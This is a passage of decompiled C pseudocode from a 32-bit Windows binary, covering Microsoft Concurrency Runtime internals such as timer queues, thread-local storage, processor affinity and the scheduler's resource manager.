  return CreateTimerQueueTimer(phNewTimer, TimerQueue, Callback, Parameter, DueTime, Period, Flags);
}

//----- (0042FDE8) --------------------------------------------------------
int __cdecl sub_42FDE8(HANDLE TimerQueue, HANDLE Timer, HANDLE CompletionEvent)
{
  int i; // esi
  int result; // eax

  for ( i = 16; i > 0; --i )
  {
    result = DeleteTimerQueueTimer(TimerQueue, Timer, CompletionEvent);
    if ( result )
      break;
    result = GetLastError();
    if ( result == 997 )
      break;
  }
  return result;
}

//----- (0042FE17) --------------------------------------------------------
int __cdecl sub_42FE17(int a1)
{
  int (__thiscall *v1)(_DWORD, int); // esi

  v1 = (int (__thiscall *)(_DWORD, int))sub_430237(dword_492790);
  return v1(v1, a1);
}
// 492790: using guessed type int dword_492790;

//----- (0042FE39) --------------------------------------------------------
struct _SYSTEM_LOGICAL_PROCESSOR_INFORMATION *__cdecl sub_42FE39(PDWORD ReturnedLength)
{
  struct _SYSTEM_LOGICAL_PROCESSOR_INFORMATION *v1; // eax
  struct _SYSTEM_LOGICAL_PROCESSOR_INFORMATION *v2; // edi
  int LastError; // eax
  int v5; // [esp+8h] [ebp-10h] BYREF
  _DWORD pExceptionObject[3]; // [esp+Ch] [ebp-Ch] BYREF

  GetLogicalProcessorInformation(0, ReturnedLength);
  if ( GetLastError() != 122 )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_10;
    goto LABEL_9;
  }
  v1 = (struct _SYSTEM_LOGICAL_PROCESSOR_INFORMATION *)malloc(*ReturnedLength);
  v2 = v1;
  if ( !v1 )
  {
    sub_4295F3(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
  }
  if ( !GetLogicalProcessorInformation(v1, ReturnedLength) )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_10;
LABEL_9:
    LastError = (unsigned __int16)LastError | 0x80070000;
LABEL_10:
    sub_43065D(&v5, LastError);
    _CxxThrowException(&v5, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return v2;
}
// 42FE39: using guessed type _DWORD pExceptionObject[3];

//----- (0042FEC0) --------------------------------------------------------
void *__cdecl sub_42FEC0(int a1, size_t *a2)
{
  HMODULE ModuleHandleW; // eax
  BOOL (__stdcall *GetLogicalProcessorInformationEx)(LOGICAL_PROCESSOR_RELATIONSHIP, PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX, PDWORD); // eax
  BOOL (__stdcall *v4)(LOGICAL_PROCESSOR_RELATIONSHIP, PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX, PDWORD); // esi
  int LastError; // eax
  void *v6; // eax
  void *v7; // edi
  int v9; // [esp+Ch] [ebp-10h] BYREF
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-Ch] BYREF

  ModuleHandleW = GetModuleHandleW(L"kernel32.dll");
  GetLogicalProcessorInformationEx = (BOOL (__stdcall *)(LOGICAL_PROCESSOR_RELATIONSHIP, PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX, PDWORD))GetProcAddress(ModuleHandleW, "GetLogicalProcessorInformationEx");
  v4 = GetLogicalProcessorInformationEx;
  if ( !GetLogicalProcessorInformationEx )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_11;
    goto LABEL_10;
  }
  ((void (__thiscall *)(BOOL (__stdcall *)(LOGICAL_PROCESSOR_RELATIONSHIP, PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX, PDWORD), int, _DWORD, size_t *))GetLogicalProcessorInformationEx)(
    GetLogicalProcessorInformationEx,
    a1,
    0,
    a2);
  if ( GetLastError() != 122 )
    goto LABEL_3;
  v6 = malloc(*a2);
  v7 = v6;
  if ( !v6 )
  {
    sub_4295F3(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
  }
  if ( !((int (__thiscall *)(BOOL (__stdcall *)(LOGICAL_PROCESSOR_RELATIONSHIP, PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX, PDWORD), int, void *, size_t *))v4)(
          v4,
          a1,
          v6,
          a2) )
  {
LABEL_3:
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_11;
LABEL_10:
    LastError = (unsigned __int16)LastError | 0x80070000;
LABEL_11:
    sub_43065D(&v9, LastError);
    _CxxThrowException(&v9, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return v7;
}
// 42FEC0: using guessed type _DWORD pExceptionObject[3];

//----- (0042FF74) --------------------------------------------------------
ULONG sub_42FF74()
{
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-14h] BYREF
  ULONG HighestNodeNumber; // [esp+10h] [ebp-4h] BYREF

  if ( !GetNumaHighestNodeNumber(&HighestNodeNumber) )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_43065D(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return HighestNodeNumber;
}
// 42FF74: using guessed type _DWORD pExceptionObject[4];

//----- (0042FFB7) --------------------------------------------------------
int __cdecl sub_42FFB7(int a1, int a2)
{
  void (__thiscall *v2)(_DWORD, int, int); // esi
  HANDLE CurrentProcess; // eax
  ULONG_PTR SystemAffinityMask; // [esp+0h] [ebp-8h] BYREF
  ULONG_PTR ProcessAffinityMask; // [esp+4h] [ebp-4h] BYREF

  if ( sub_43268A() < 4 )
  {
    CurrentProcess = GetCurrentProcess();
    GetProcessAffinityMask(CurrentProcess, &ProcessAffinityMask, &SystemAffinityMask);
    *(_WORD *)(a2 + 4) = 0;
    *(_DWORD *)a2 = ProcessAffinityMask;
  }
  else
  {
    v2 = (void (__thiscall *)(_DWORD, int, int))sub_430237(dword_492798);
    v2(v2, a1, a2);
  }
  return 1;
}
// 43268A: using guessed type int sub_43268A(void);
// 492798: using guessed type int dword_492798;

//----- (00430010) --------------------------------------------------------
int __cdecl sub_430010(HANDLE hThread)
{
  return GetThreadPriority(hThread);
}

//----- (00430023) --------------------------------------------------------
int __cdecl sub_430023(LPCRITICAL_SECTION lpCriticalSection, DWORD dwSpinCount)
{
  return __crtInitializeCriticalSectionEx(lpCriticalSection, dwSpinCount, 0);
}

//----- (00430038) --------------------------------------------------------
HANDLE __cdecl sub_430038(HANDLE hObject, WAITORTIMERCALLBACK Callback, PVOID Context)
{
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-14h] BYREF
  HANDLE phNewWaitObject; // [esp+10h] [ebp-4h] BYREF

  if ( !RegisterWaitForSingleObject(&phNewWaitObject, hObject, Callback, Context, 0xFFFFFFFF, 0xCu) )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_43065D(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return phNewWaitObject;
}
// 430038: using guessed type _DWORD pExceptionObject[4];

//----- (00430088) --------------------------------------------------------
int __cdecl sub_430088(HANDLE hThread, DWORD_PTR *a2)
{
  void (__thiscall *v2)(_DWORD, HANDLE, DWORD_PTR *, _DWORD); // esi

  if ( sub_43268A() < 4 )
  {
    SetThreadAffinityMask(hThread, *a2);
  }
  else
  {
    v2 = (void (__thiscall *)(_DWORD, HANDLE, DWORD_PTR *, _DWORD))sub_430237(dword_492794);
    v2(v2, hThread, a2, 0);
  }
  return 1;
}
// 43268A: using guessed type int sub_43268A(void);
// 492794: using guessed type int dword_492794;

//----- (004300CC) --------------------------------------------------------
BOOL __cdecl sub_4300CC(HANDLE hThread, int nPriority)
{
  BOOL result; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF

  result = SetThreadPriority(hThread, nPriority);
  if ( !result )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_43065D(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return result;
}
// 4300CC: using guessed type _DWORD pExceptionObject[4];

//----- (0043010E) --------------------------------------------------------
DWORD __cdecl sub_43010E(HANDLE hObjectToSignal, HANDLE hObjectToWaitOn, DWORD dwMilliseconds, BOOL bAlertable)
{
  return SignalObjectAndWait(hObjectToSignal, hObjectToWaitOn, dwMilliseconds, bAlertable);
}

//----- (00430125) --------------------------------------------------------
void __cdecl sub_430125(DWORD dwMilliseconds)
{
  Sleep(dwMilliseconds);
}

//----- (00430139) --------------------------------------------------------
DWORD sub_430139()
{
  DWORD result; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF

  result = TlsAlloc();
  if ( result == -1 )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_43065D(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return result;
}
// 430139: using guessed type _DWORD pExceptionObject[4];

//----- (00430176) --------------------------------------------------------
BOOL __cdecl sub_430176(DWORD dwTlsIndex)
{
  return TlsFree(dwTlsIndex);
}

//----- (00430184) --------------------------------------------------------
LPVOID __cdecl sub_430184(DWORD dwTlsIndex)
{
  return TlsGetValue(dwTlsIndex);
}

//----- (00430192) --------------------------------------------------------
BOOL __cdecl sub_430192(DWORD dwTlsIndex, LPVOID lpTlsValue)
{
  BOOL result; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF

  result = TlsSetValue(dwTlsIndex, lpTlsValue);
  if ( !result )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_43065D(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return result;
}
// 430192: using guessed type _DWORD pExceptionObject[4];

//----- (004301D4) --------------------------------------------------------
BOOL __cdecl sub_4301D4(HANDLE WaitHandle)
{
  return UnregisterWait(WaitHandle);
}

//----- (004301E2) --------------------------------------------------------
DWORD __cdecl sub_4301E2(HANDLE hHandle, DWORD dwMilliseconds)
{
  return WaitForSingleObjectEx(hHandle, dwMilliseconds, 0);
}

//----- (004301F5) --------------------------------------------------------
int __thiscall sub_4301F5(int this, char a2)
{
  int result; // eax

  if ( a2 )
    result = _InterlockedIncrement((volatile signed __int32 *)(this + 1288));
  else
    result = *(_DWORD *)(this + 1280) - *(_DWORD *)(this + 1284);
  if ( result == 1 )
    return SetEvent(*(HANDLE *)this);
  return result;
}

//----- (00430229) --------------------------------------------------------
int *sub_430229()
{
  int *result; // eax

  if ( hLibModule )
    return sub_43552B();
  return result;
}

//----- (00430237) --------------------------------------------------------
int __cdecl sub_430237(int a1)
{
  return a1 ^ dword_49280C;
}
// 49280C: using guessed type int dword_49280C;

//----- (00430244) --------------------------------------------------------
HMODULE __cdecl sub_430244(int a1)
{
  HMODULE result; // eax

  __crtSetThreadpoolTimer(a1, 0, 0, 0);
  unknown_libname_41(a1, 1);
  unknown_libname_31(a1);
  sub_43552B();
  result = hLibModule;
  if ( hLibModule )
    return (HMODULE)FreeLibrary(hLibModule);
  return result;
}
// 42BF64: using guessed type _DWORD __cdecl unknown_libname_31(_DWORD);
// 42C22C: using guessed type _DWORD __cdecl __crtSetThreadpoolTimer(_DWORD, _DWORD, _DWORD, _DWORD);
// 42C2D4: using guessed type _DWORD __cdecl unknown_libname_41(_DWORD, _DWORD);

//----- (00430280) --------------------------------------------------------
HMODULE __cdecl sub_430280(DWORD dwExitCode)
{
  HMODULE result; // eax

  result = (HMODULE)_InterlockedExchangeAdd(&dword_4927A0, 0xFFFFFFFF);
  if ( !result )
  {
    sub_43552B();
    result = hLibModule;
    if ( hLibModule )
      FreeLibraryAndExitThread(hLibModule, dwExitCode);
  }
  return result;
}
// 4927A0: using guessed type int dword_4927A0;

//----- (004302AA) --------------------------------------------------------
uintptr_t sub_4302AA()
{
  uintptr_t v0; // esi
  HANDLE CurrentThread; // eax
  struct _FILETIME CreationTime; // [esp+4h] [ebp-10h] BYREF
  struct _FILETIME ExitTime; // [esp+Ch] [ebp-8h] BYREF

  dword_492808 = 1;
  v0 = __security_cookie ^ (unsigned int)EncodePointer(&dword_49280C);
  CurrentThread = GetCurrentThread();
  if ( GetThreadTimes(CurrentThread, &CreationTime, &ExitTime, &ExitTime, &ExitTime) )
    v0 ^= CreationTime.dwLowDateTime ^ CreationTime.dwHighDateTime;
  return v0;
}
// 492808: using guessed type int dword_492808;
// 49280C: using guessed type int dword_49280C;

//----- (004302F6) --------------------------------------------------------
int __cdecl sub_4302F6(
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        SIZE_T dwStackSize,
        LPTHREAD_START_ROUTINE lpStartAddress,
        LPVOID lpParameter,
        DWORD dwCreationFlags,
        LPDWORD lpThreadId)
{
  int Semaphore; // esi

  Semaphore = __crtCreateSemaphoreExW_0(
                lpThreadAttributes,
                dwStackSize,
                lpStartAddress,
                lpParameter,
                dwCreationFlags,
                lpThreadId);
  if ( Semaphore && _InterlockedIncrement(&dword_4927A0) == 1 )
  {
    sub_43033C();
    _InterlockedIncrement(&dword_48C354);
  }
  return Semaphore;
}
// 48C354: using guessed type int dword_48C354;
// 4927A0: using guessed type int dword_4927A0;

//----- (0043033C) --------------------------------------------------------
HMODULE sub_43033C()
{
  HMODULE result; // eax
  DWORD ModuleFileNameW; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+4h] [ebp-21Ch] BYREF
  WCHAR Filename[260]; // [esp+14h] [ebp-20Ch] BYREF

  result = GetModuleHandleA(0);
  if ( result != (HMODULE)0x400000 )
  {
    ModuleFileNameW = GetModuleFileNameW((HMODULE)0x400000, Filename, 0x104u);
    if ( !ModuleFileNameW || ModuleFileNameW == 260 )
    {
      LastError = GetLastError();
      if ( LastError > 0 )
        LastError = (unsigned __int16)LastError | 0x80070000;
      sub_43065D(pExceptionObject, LastError);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
    }
    result = LoadLibraryExW(Filename, 0, 0);
    hLibModule = result;
  }
  return result;
}
// 43033C: using guessed type _DWORD pExceptionObject[4];

//----- (004303D0) --------------------------------------------------------
int __cdecl sub_4303D0(unsigned int a1, int a2, int a3, char a4)
{
  int result; // eax
  int v5; // esi
  __int64 v6; // [esp+4h] [ebp-8h] BYREF

  result = unknown_libname_33(a2, a3, 0);
  v5 = result;
  if ( result )
  {
    sub_43033C();
    _InterlockedIncrement(&dword_48C354);
    v6 = -10000i64 * a1;
    __crtSetThreadpoolTimer(v5, &v6, a4 != 0 ? a1 : 0, 0);
    return v5;
  }
  return result;
}
// 42C035: using guessed type _DWORD __cdecl unknown_libname_33(_DWORD, _DWORD, _DWORD);
// 42C22C: using guessed type _DWORD __cdecl __crtSetThreadpoolTimer(_DWORD, _DWORD, _DWORD, _DWORD);
// 48C354: using guessed type int dword_48C354;

//----- (0043042F) --------------------------------------------------------
int __cdecl sub_43042F(int a1, int a2, int a3)
{
  int result; // eax
  int v4; // esi

  result = unknown_libname_34(a2, a3, 0);
  v4 = result;
  if ( result )
  {
    sub_43033C();
    _InterlockedIncrement(&dword_48C354);
    __crtSetThreadpoolWait(v4, a1, 0);
    return v4;
  }
  return result;
}
// 42C05D: using guessed type _DWORD __cdecl unknown_libname_34(_DWORD, _DWORD, _DWORD);
// 42C253: using guessed type _DWORD __cdecl __crtSetThreadpoolWait(_DWORD, _DWORD, _DWORD);
// 48C354: using guessed type int dword_48C354;

//----- (00430468) --------------------------------------------------------
HMODULE __cdecl sub_430468(int a1, int a2)
{
  HMODULE result; // eax

  __crtSetThreadpoolTimer(a2, 0, 0, 0);
  unknown_libname_31(a2);
  sub_43552B();
  result = hLibModule;
  if ( hLibModule )
    return (HMODULE)unknown_libname_35(a1, hLibModule);
  return result;
}
// 42BF64: using guessed type _DWORD __cdecl unknown_libname_31(_DWORD);
// 42C09C: using guessed type _DWORD __cdecl unknown_libname_35(_DWORD, _DWORD);
// 42C22C: using guessed type _DWORD __cdecl __crtSetThreadpoolTimer(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0043049E) --------------------------------------------------------
HMODULE __cdecl sub_43049E(int a1, int a2)
{
  HMODULE result; // eax

  __crtSetThreadpoolWait(a2, 0, 0);
  unknown_libname_32(a2);
  sub_43552B();
  result = hLibModule;
  if ( hLibModule )
    return (HMODULE)unknown_libname_35(a1, hLibModule);
  return result;
}
// 42BF82: using guessed type _DWORD __cdecl unknown_libname_32(_DWORD);
// 42C09C: using guessed type _DWORD __cdecl unknown_libname_35(_DWORD, _DWORD);
// 42C253: using guessed type _DWORD __cdecl __crtSetThreadpoolWait(_DWORD, _DWORD, _DWORD);

//----- (004304D3) --------------------------------------------------------
__int32 __thiscall sub_4304D3(volatile __int32 *this)
{
  sub_438FB0();
  return sub_4304E3(this);
}
// 438FB0: using guessed type int sub_438FB0(void);

//----- (004304E3) --------------------------------------------------------
__int32 __thiscall sub_4304E3(volatile __int32 *this)
{
  __int32 result; // eax
  char v3[8]; // [esp+4h] [ebp-10h] BYREF
  int v4; // [esp+Ch] [ebp-8h]
  void (*v5)(); // [esp+10h] [ebp-4h]

  result = _InterlockedExchange(this, 1);
  if ( result )
  {
    v4 = 0;
    v5 = sub_43051F;
    do
    {
      sub_42E8F5((int)v3);
      result = _InterlockedExchange(this, 1);
    }
    while ( result );
  }
  return result;
}
// 4304E3: using guessed type char var_10[8];

//----- (00430514) --------------------------------------------------------
int __thiscall sub_430514(_DWORD *this)
{
  *this = 0;
  return sub_438FB0();
}
// 438FB0: using guessed type int sub_438FB0(void);

//----- (0043051F) --------------------------------------------------------
void sub_43051F()
{
  sub_430125(0);
}

//----- (00430528) --------------------------------------------------------
char __thiscall sub_430528(volatile __int32 *this)
{
  char v2; // bl

  sub_438FB0();
  v2 = sub_430548(this);
  if ( !v2 )
    sub_438FB0();
  return v2;
}
// 438FB0: using guessed type int sub_438FB0(void);

//----- (00430548) --------------------------------------------------------
char __thiscall sub_430548(volatile __int32 *this)
{
  char v1; // dl

  if ( *this )
    return 0;
  v1 = 1;
  if ( _InterlockedExchange(this, 1) )
    return 0;
  return v1;
}

//----- (0043055D) --------------------------------------------------------
int sub_43055D()
{
  LPVOID v0; // eax

  v0 = sub_437820();
  if ( v0 )
    return (*(int (__thiscall **)(LPVOID))(*(_DWORD *)v0 + 32))(v0);
  else
    return SwitchToThread();
}

//----- (004305A6) --------------------------------------------------------
std::exception *__thiscall sub_4305A6(std::exception *this, char *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &Concurrency::improper_lock::`vftable';
  return this;
}
// 470D34: using guessed type void *Concurrency::improper_lock::`vftable';

//----- (004305F4) --------------------------------------------------------
std::exception *__thiscall sub_4305F4(std::exception *this, char *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &Concurrency::invalid_scheduler_policy_key::`vftable';
  return this;
}
// 470ED0: using guessed type void *Concurrency::invalid_scheduler_policy_key::`vftable';

//----- (00430620) --------------------------------------------------------
std::exception *__thiscall sub_430620(std::exception *this, char *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &Concurrency::invalid_scheduler_policy_value::`vftable';
  return this;
}
// 470EDC: using guessed type void *Concurrency::invalid_scheduler_policy_value::`vftable';

//----- (0043065D) --------------------------------------------------------
_DWORD *__thiscall sub_43065D(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  this[1] = 0;
  this[2] = 0;
  this[3] = a2;
  result = this;
  *this = &Concurrency::scheduler_resource_allocation_error::`vftable';
  return result;
}
// 470E00: using guessed type void *Concurrency::scheduler_resource_allocation_error::`vftable';

//----- (0043067A) --------------------------------------------------------
_DWORD *__thiscall sub_43067A(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  this[1] = 0;
  this[2] = 0;
  this[3] = a2;
  result = this;
  *this = &Concurrency::scheduler_worker_creation_error::`vftable';
  return result;
}
// 470E7C: using guessed type void *Concurrency::scheduler_worker_creation_error::`vftable';

//----- (004306A8) --------------------------------------------------------
int sub_4306A8()
{
  int v0; // edi

  v0 = sub_42E59B();
  return (*(int (__thiscall **)(int))(*(_DWORD *)v0 + 24))(v0);
}
// 42E59B: using guessed type int sub_42E59B(void);

//----- (004306CA) --------------------------------------------------------
_DWORD *__thiscall sub_4306CA(_DWORD *this, int a2)
{
  *this = 0;
  this[1] = 0;
  this[2] = 0;
  sub_42FFB7(a2, (int)this);
  return this;
}

//----- (004306EB) --------------------------------------------------------
int __thiscall sub_4306EB(int this)
{
  _BYTE *v2; // eax
  _DWORD pExceptionObject[6]; // [esp+10h] [ebp-1Ch] BYREF
  int v5; // [esp+28h] [ebp-4h]

  pExceptionObject[3] = this;
  *(_DWORD *)this = &Concurrency::details::ResourceManager::`vftable';
  *(_DWORD *)(this + 4) = 0;
  *(_DWORD *)(this + 8) = 0;
  *(_DWORD *)(this + 12) = 16;
  *(_DWORD *)(this + 16) = 0;
  *(_DWORD *)(this + 36) = 0;
  *(_DWORD *)(this + 40) = 0;
  sub_42E44D((LPCRITICAL_SECTION)(this + 44));
  *(_DWORD *)(this + 68) = 0;
  *(_DWORD *)(this + 72) = 0;
  *(_DWORD *)(this + 76) = 0;
  *(_DWORD *)(this + 80) = 0;
  *(_DWORD *)(this + 84) = 0;
  *(_DWORD *)(this + 88) = 0;
  *(_DWORD *)(this + 92) = 0;
  v5 = 0;
  *(_DWORD *)(this + 96) = 0;
  *(_DWORD *)(this + 100) = 0;
  sub_43C0E9((char *)(this + 104));
  LOBYTE(v5) = 1;
  sub_432B72(1);
  sub_43116A((_DWORD *)this);
  if ( dword_4927DC < 3 )
  {
    v2 = VirtualAlloc(0, 0x1000u, 0x3000u, 4u);
    *(_DWORD *)(this + 140) = v2;
    if ( !v2 )
    {
      sub_4295F3(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
    }
    *v2 = 1;
  }
  else
  {
    *(_DWORD *)(this + 140) = 0;
  }
  *(_DWORD *)(this + 80) = sub_42FD5D(0);
  *(_DWORD *)(this + 84) = unknown_libname_45((unsigned __int64)*(unsigned int *)(this + 12) >> 30 != 0 ? -1 : 4 * *(_DWORD *)(this + 12));
  return this;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);
// 470F3C: using guessed type void *Concurrency::details::ResourceManager::`vftable';
// 4927DC: using guessed type int dword_4927DC;

//----- (004307CF) --------------------------------------------------------
void *__thiscall sub_4307CF(_DWORD *this)
{
  void *result; // eax

  this[3] = 0;
  result = this;
  this[4] = 0;
  return result;
}

//----- (004307DA) --------------------------------------------------------
std::exception *__thiscall sub_4307DA(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &Concurrency::invalid_operation::`vftable';
  return this;
}
// 470F0C: using guessed type void *Concurrency::invalid_operation::`vftable';

//----- (00430806) --------------------------------------------------------
std::exception *__thiscall sub_430806(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &Concurrency::unsupported_os::`vftable';
  return this;
}
// 470E88: using guessed type void *Concurrency::unsupported_os::`vftable';

//----- (00430821) --------------------------------------------------------
void __thiscall sub_430821(void **this)
{
  sub_42CF7C(this[9]);
}

//----- (0043082E) --------------------------------------------------------
void __thiscall sub_43082E(char *this)
{
  unsigned int v2; // edi
  int v3; // ebx
  Concurrency::details::GlobalCore *v4; // ecx
  Concurrency::details::GlobalCore *v5; // ecx
  void *v6; // eax

  v2 = 0;
  *(_DWORD *)this = &Concurrency::details::ResourceManager::`vftable';
  if ( *((_DWORD *)this + 6) )
  {
    v3 = 0;
    do
    {
      v4 = *(Concurrency::details::GlobalCore **)(*((_DWORD *)this + 18) + v3 + 32);
      if ( v4 )
        Concurrency::details::GlobalCore::`vector deleting destructor'(v4, 3u);
      ++v2;
      v3 += 40;
    }
    while ( v2 < *((_DWORD *)this + 6) );
  }
  v5 = (Concurrency::details::GlobalCore *)*((_DWORD *)this + 18);
  if ( v5 )
    Concurrency::details::GlobalCore::`vector deleting destructor'(v5, 3u);
  j_j_j___free_base(*((void **)this + 17));
  v6 = (void *)*((_DWORD *)this + 35);
  if ( v6 )
    VirtualFree(v6, 0, 0x8000u);
  CloseHandle(*((HANDLE *)this + 20));
  j_j_j___free_base(*((void **)this + 21));
  if ( *((_DWORD *)this + 19) )
  {
    sub_42FD4F(*((HANDLE *)this + 19));
    j_j_j___free_base(*((void **)this + 22));
    j_j_j___free_base(*((void **)this + 23));
  }
  sub_43C124((_DWORD *)this + 26);
  sub_42E4D7((LPCRITICAL_SECTION)(this + 44));
}
// 470F3C: using guessed type void *Concurrency::details::ResourceManager::`vftable';

//----- (00430901) --------------------------------------------------------
void __thiscall sub_430901(LPCRITICAL_SECTION *this)
{
  sub_42E8A1(*this);
}

//----- (00430937) --------------------------------------------------------
_DWORD *__thiscall sub_430937(_DWORD *this)
{
  _DWORD *result; // eax

  result = (_DWORD *)*this;
  *(_DWORD *)*this = 0;
  return result;
}

//----- (004309CA) --------------------------------------------------------
void **__thiscall sub_4309CA(void **Block, char a2)
{
  sub_42CF7C(Block[1]);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (004309F3) --------------------------------------------------------
int __thiscall sub_4309F3(_DWORD *this, int a2)
{
  int result; // eax

  result = this[1];
  if ( result )
  {
    *(_DWORD *)(a2 + 24) = *(_DWORD *)(result + 24);
    *(_DWORD *)(a2 + 28) = this[1];
    *(_DWORD *)(*(_DWORD *)(this[1] + 24) + 28) = a2;
    result = this[1];
    *(_DWORD *)(result + 24) = a2;
  }
  else
  {
    *(_DWORD *)(a2 + 24) = a2;
    *(_DWORD *)(a2 + 28) = a2;
  }
  ++*this;
  this[1] = a2;
  return result;
}

//----- (00430A2C) --------------------------------------------------------
unsigned int __thiscall sub_430A2C(int *this, unsigned int a2, unsigned int a3, unsigned int a4)
{
  unsigned int v4; // eax
  unsigned int v5; // esi
  unsigned int i; // esi
  int v7; // edx
  unsigned int v8; // esi
  _DWORD *v9; // edx

  v4 = a3;
  v5 = a2;
  if ( a2 >= a3 )
  {
    v8 = 0;
    if ( a4 )
    {
      do
      {
        v9 = *(_DWORD **)(this[23] + 4 * v8++);
        v9[1] = v9[9] - *(_DWORD *)(v9[4] + 160);
      }
      while ( v8 < a4 );
      return a3;
    }
    return v4;
  }
  else if ( a4 == 1 )
  {
    *(_DWORD *)(*(_DWORD *)this[23] + 4) = a2;
  }
  else
  {
    if ( a4 )
    {
      for ( i = 0; i < a4; ++i )
      {
        v7 = *(_DWORD *)(this[23] + 4 * i);
        *(double *)(v7 + 8) = (double)(unsigned int)(*(_DWORD *)(v7 + 36) - *(_DWORD *)(*(_DWORD *)(v7 + 16) + 160))
                            * ((double)a2
                             / (double)a3);
      }
      v5 = a2;
    }
    sub_433F60(this[23], a4);
  }
  return v5;
}

//----- (00430AFC) --------------------------------------------------------
int __thiscall sub_430AFC(_DWORD *this, int a2)
{
  int result; // eax

  result = sub_4323F9(this, *(_WORD *)(a2 + 4));
  if ( result )
  {
    result = *(_DWORD *)result;
    *(_DWORD *)a2 &= result;
  }
  else
  {
    *(_DWORD *)a2 = 0;
  }
  return result;
}

//----- (00430B1F) --------------------------------------------------------
int __cdecl sub_430B1F(int *a1)
{
  int result; // eax
  int v2[3]; // [esp+8h] [ebp-Ch] BYREF

  memset(v2, 0, sizeof(v2));
  v2[0] = *a1;
  sub_430B4A(v2);
  result = v2[0];
  *a1 = v2[0];
  return result;
}

//----- (00430B4A) --------------------------------------------------------
int __cdecl sub_430B4A(_DWORD *a1)
{
  int result; // eax
  _DWORD *v2; // ecx

  result = (int)a1;
  if ( *a1 )
  {
    v2 = dword_4927C8;
    if ( dword_4927C8 )
      return sub_430AFC(v2, (int)a1);
    v2 = (_DWORD *)dword_4927C4;
    if ( dword_4927C4 )
      return sub_430AFC(v2, (int)a1);
  }
  return result;
}
// 4927C4: using guessed type int dword_4927C4;

//----- (00430B71) --------------------------------------------------------
int __thiscall sub_430B71(DWORD_PTR *this, HANDLE hThread)
{
  return sub_430088(hThread, this);
}

//----- (00430B83) --------------------------------------------------------
ULONG_PTR sub_430B83()
{
  HANDLE CurrentProcess; // eax
  ULONG_PTR result; // eax
  HANDLE CurrentThread; // eax
  ULONG_PTR *v3; // esi
  ULONG_PTR v4; // edx
  __int16 v5; // cx
  _DWORD *v6; // esi
  ULONG_PTR *v7; // eax
  ULONG_PTR *v8; // edx
  ULONG_PTR v9; // ecx
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+10h] [ebp-30h] BYREF
  void *Block; // [esp+20h] [ebp-20h]
  int v13; // [esp+24h] [ebp-1Ch] BYREF
  __int16 v14; // [esp+28h] [ebp-18h]
  int v15; // [esp+3Ch] [ebp-4h]

  CurrentProcess = GetCurrentProcess();
  if ( !GetProcessAffinityMask(CurrentProcess, &ProcessAffinityMask, &SystemAffinityMask) )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_43065D(pExceptionObject, LastError);
